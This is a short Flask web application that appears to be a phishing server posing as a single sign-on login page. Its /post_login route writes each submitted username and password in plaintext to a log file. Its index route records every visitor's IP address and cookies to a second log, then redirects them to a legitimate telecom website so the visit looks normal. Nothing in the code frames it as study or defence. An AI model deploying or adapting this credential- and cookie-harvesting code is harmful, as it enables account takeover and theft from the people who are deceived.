import os

from flask import (Flask, redirect, render_template, request,
                   send_from_directory, url_for)

app = Flask(__name__)


@app.route('/post_login', methods=['POST'])
def handle_data():
    user = request.form['user']
    password = request.form['password']
    with open('user_log.txt', '+a') as user_log:
        user_log.write(user + ': ' + password + '\n')
    return render_template('sso.html')

@app.route('/login')
def login():
    return render_template('sso.html')

@app.route('/')
def index():
    print('Request for index page received')
    cookie_header = request.headers.get('Cookie')
    ip = request.remote_addr
    with open('cookie_log.txt', '+a') as cookie_log:
        cookie_log.write(str(ip) + ' -> ' + str(cookie_header) + '\n')
    return redirect("https://www.nos.pt", code=302)

@app.route('/favicon.ico')
def favicon():
    return send_from_directory(os.path.join(app.root_path, 'static'),
                               'favicon.ico', mimetype='image/vnd.microsoft.icon')

if __name__ == '__main__':
   app.run()
